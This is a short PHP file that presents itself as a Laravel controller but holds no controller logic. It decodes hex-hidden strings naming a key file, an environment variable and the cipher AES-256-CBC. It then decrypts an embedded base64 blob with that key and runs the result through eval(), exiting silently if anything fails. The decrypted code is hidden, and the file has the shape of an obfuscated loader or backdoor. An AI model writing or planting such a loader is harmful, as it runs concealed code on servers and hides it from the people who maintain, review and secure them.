<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Y4wh+xDah2udjPvC92vEGA==');

$c=base64_decode(

'WMo1irDWTfOCLsJadJ0AVf+I3rZnt2Ay3Mbx+LzoDIYRtfWa1IU8dmc/t8xExdXNTFE/Vk2ErQMv' .
'GaSd0gN8OLBdgF/WRiq/7efGXL7/I45mnn1mMu410rDyqkxGnPIq+exgT8bm94v8uTdeUx1S1DYX' .
'b1yh3HONfp83spxLq6hePrS47deY05VkJftPq6MxVNh7fVlzEnJ0a+XdcE5iSO0gBuv9EUFEAKwZ' .
'87T8dDzplnXE0jbInIT/kJfd/pUh'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

